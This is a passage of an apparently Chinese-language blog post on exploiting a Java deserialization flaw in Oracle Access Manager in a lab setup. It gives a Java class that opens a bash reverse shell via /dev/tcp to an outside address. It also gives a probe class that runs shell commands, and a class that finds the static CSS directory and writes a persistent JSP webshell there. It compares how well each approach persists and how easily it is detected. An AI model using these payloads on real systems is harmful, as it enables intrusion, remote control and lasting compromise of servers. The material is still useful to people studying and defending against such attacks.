</span></span></code></pre></td></tr></table></div></div><h2 id=revjava反弹shell>rev.java：反弹shell<a hidden class=anchor aria-hidden=true href=#revjava反弹shell>#</a></h2><h3 id=优缺点>优缺点<a hidden class=anchor aria-hidden=true href=#优缺点>#</a></h3><p>优点：</p><ol><li>可以获得一个shell。视觉冲击强，互操作性强。</li><li>成功率高。由恶意类代码简单，只要反序列化成功了就能执行到恶意代码，不存在像内存马那样需要复杂的、版本相关的获取各种对象的过程，不确定因素较少。</li></ol><p>缺点：</p><ol><li>多数情况下只能反弹到内网。必须在服务端网络可达的地方接收shell，大多数情况下这意味着攻击者的网络位置需要在内网。</li><li>持久化效果一般。一个请求只能获得一个shell，反弹的shell还容易超时，一直保持的网络连接也容易引起运维人员的警觉。</li></ol><h3 id=最终效果>最终效果<a hidden class=anchor aria-hidden=true href=#最终效果>#</a></h3><p><img loading=lazy src=image-20220701120445251.png alt=image-20220701120445251></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-93-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-93-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-93-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-93-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-93-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-93-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-93-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-93-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-93-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-93-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-93-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-93-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-93-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-93-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-93-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-93-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-93-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-93-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-93-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-93-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-93-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-93-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-93-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-93-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-93-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-93-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-93-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-93-14>14</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.*<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>rev</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//    ref: https://www.jianshu.com/p/ae3922db1f70
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>rev</span><span style=color:#f92672>(){</span>
</span></span><span style=display:flex><span>			String<span style=color:#f92672>[]</span> cmdarray<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> String<span style=color:#f92672>[]{</span><span style=color:#e6db74>&#34;bash&#34;</span><span style=color:#f92672>,</span><span style=color:#e6db74>&#34;-c&#34;</span><span style=color:#f92672>,</span><span style=color:#e6db74>&#34;bash -i &gt;&amp; /dev/tcp/172.18.0.1/2345 0&gt;&amp;1&#34;</span><span style=color:#f92672>};</span> 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>getRuntime</span><span style=color:#f92672>().</span><span style=color:#a6e22e>exec</span><span style=color:#f92672>(</span>cmdarray<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>IOException e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            e<span style=color:#f92672>.</span><span style=color:#a6e22e>printStackTrace</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=wjspjava遍历目录写jsp木马>wjsp.java：遍历目录写jsp木马<a hidden class=anchor aria-hidden=true href=#wjspjava遍历目录写jsp木马>#</a></h2><h3 id=探索过程>探索过程<a hidden class=anchor aria-hidden=true href=#探索过程>#</a></h3><p>访问本地OAM的主页发现有一处静态文件 http://192.168.175.139:14100/oam/pages/css/login_page.css ，如果我们能在 /page/css/ 路径下放一个jsp文件，那么就能得到一个webshell。</p><p>在OAM容器中寻找login_page.css发现有两处（正常情况下应该只有一处，因为这里我重启过容器，所以有多处）：</p><p><img loading=lazy src=image-20220708101015991.png alt=image-20220708101015991></p><p>可以看到其路径是 <code>/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam_server/xrd2uw/war/pages/css/login_page.css</code> ，其中存在随机字符串 <code>xrd2uw</code> 和 <code>hukic2</code> 。</p><p>尝试往目录中写入jsp文件，可以成功执行。</p><p>（有些奇怪的是，直接在磁盘上面创建的CSS文件可以被访问，直接在磁盘上面创建的JSP文件却不能被解析和访问，只有通过反序列化写进去的jsp文件才能够被解析和执行，这一度导致我认为往这个目录写jsp行不通。）</p><p>（只有第一次写能生效，重写jsp文件内容的话，因为已经编译成class了，所以修改的内容不会生效。）</p><p><img loading=lazy src=image-20220701095527585.png alt=image-20220701095527585></p><p><img loading=lazy src=image-20220701095536512.png alt=image-20220701095536512></p><p>那么问题的难点就变成了如何通过Java代码找到css所在的目录，因为我们不知道目标主机的部署路径中的随机字符串。</p><p>这时很自然地会问一个问题，当我执行反序列化的时候，我所在工作目录是什么呢，是否可以通过相对路径去写jsp？</p><p>通过以下方式获取命令执行的结果，查看执行反序列化时所在的工作目录。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-20>20</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.*<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>sayhi</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>sayhi</span><span style=color:#f92672>(){</span>
</span></span><span style=display:flex><span>        String cmd<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;pwd&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        String result<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/tmp/cve/result.txt&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            PrintWriter out <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> PrintWriter<span style=color:#f92672>(</span>result<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            out<span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>execCmd<span style=color:#f92672>(</span>cmd<span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>            out<span style=color:#f92672>.</span><span style=color:#a6e22e>close</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>IOException e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> String <span style=color:#a6e22e>execCmd</span><span style=color:#f92672>(</span>String cmd<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>.</span><span style=color:#a6e22e>IOException</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        java<span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Scanner</span> s <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Scanner</span><span style=color:#f92672>(</span>Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>getRuntime</span><span style=color:#f92672>().</span><span style=color:#a6e22e>exec</span><span style=color:#f92672>(</span>cmd<span style=color:#f92672>).</span><span style=color:#a6e22e>getInputStream</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>useDelimiter</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;\\A&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> s<span style=color:#f92672>.</span><span style=color:#a6e22e>hasNext</span><span style=color:#f92672>()</span> <span style=color:#f92672>?</span> s<span style=color:#f92672>.</span><span style=color:#a6e22e>next</span><span style=color:#f92672>()</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>结果：</p><p><img loading=lazy src=image-20220708102316106.png alt=image-20220708102316106></p><p>至此可以确认工作目录是 <code>/u01/oracle/user_projects/domains/access_domain</code> 。那么只要反序列化时在当前目录下面遍历搜索找到 login_page.css 文件，并在同目录下写入neo.jsp文件就可以通过 http://192.168.175.139:14100/oam/pages/css/neo.jsp 解析并执行了。</p><p>遍历搜索的方式总归不够优雅，如果出现像我本地实例上那样存在多个部署目录的情况就可能写下多余的文件，我们通过黑盒也不会知道自己的代码究竟在哪些地方写下的文件。</p><p>于是继续探索，是否有什么方式可能通过配置文件或者从当前JVM中获取静态文件所在目录呢？随后发现 <code>System.getProperties()</code> 可以得到很多属性，其中是否有我们关心的目录呢？</p><p>经过一番观察，发现通过 <code>oracle.deployed.app.dir</code> 可以得到部署目录：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-95-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-95-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>oracle.deployed.app.dir=/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220701113816075.png alt=image-20220701113816075></p><p>前进了一步，要搜索的文件夹从 <code>/u01/oracle/user_projects/domains/access_domain</code> 变成了 <code>/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user</code> ，</p><p>距离完整路径 <code>/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam_server/xrd2uw/war/pages/css/login_page.css</code> 还差 <code>oam_server/xrd2uw/</code> 这一段是未知的。</p><p>但至此已经可以勉强实现一种方案了。</p><h3 id=优缺点-1>优缺点<a hidden class=anchor aria-hidden=true href=#优缺点-1>#</a></h3><p>优点</p><ol><li>只需要触发一次漏洞便可得到持久的webshell，动作较小。</li><li>重启机器webshell仍然存在。</li></ol><p>缺点：</p><ol><li>有文件落地，可能引起HIDS告警。</li></ol><h3 id=最终效果-1>最终效果<a hidden class=anchor aria-hidden=true href=#最终效果-1>#</a></h3><p><img loading=lazy src=image-20220701120623736.png alt=image-20220701120623736></p><p><img loading=lazy src=image-20220708111608658.png alt=image-20220708111608658></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-96-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-96-33>33</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.*<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>wjsp</span> <span style=color:#66d9ef>implements</span> Serializable <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>wjsp</span><span style=color:#f92672>(){</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//        String deploydir=&#34;/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user&#34;;
</span></span></span><span style=display:flex><span><span style=color:#75715e>//        String deploydir=&#34;/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam_server/xrd2uw/war/pages/css&#34;;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        String deploydir<span style=color:#f92672>=</span>System<span style=color:#f92672>.</span><span style=color:#a6e22e>getProperty</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;oracle.deployed.app.dir&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        loop<span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> File<span style=color:#f92672>(</span>deploydir<span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>loop</span><span style=color:#f92672>(</span>File dir<span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span><span style=color:#f92672>(</span>File file<span style=color:#f92672>:</span>dir<span style=color:#f92672>.</span><span style=color:#a6e22e>listFiles</span><span style=color:#f92672>()){</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>file<span style=color:#f92672>.</span><span style=color:#a6e22e>isFile</span><span style=color:#f92672>()){</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>file<span style=color:#f92672>.</span><span style=color:#a6e22e>getAbsolutePath</span><span style=color:#f92672>().</span><span style=color:#a6e22e>endsWith</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;login_page.css&#34;</span><span style=color:#f92672>)){</span>w<span style=color:#f92672>(</span>file<span style=color:#f92672>);}</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span><span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>file<span style=color:#f92672>.</span><span style=color:#a6e22e>isDirectory</span><span style=color:#f92672>()){</span>
</span></span><span style=display:flex><span>               loop<span style=color:#f92672>(</span>file<span style=color:#f92672>.</span><span style=color:#a6e22e>getAbsoluteFile</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
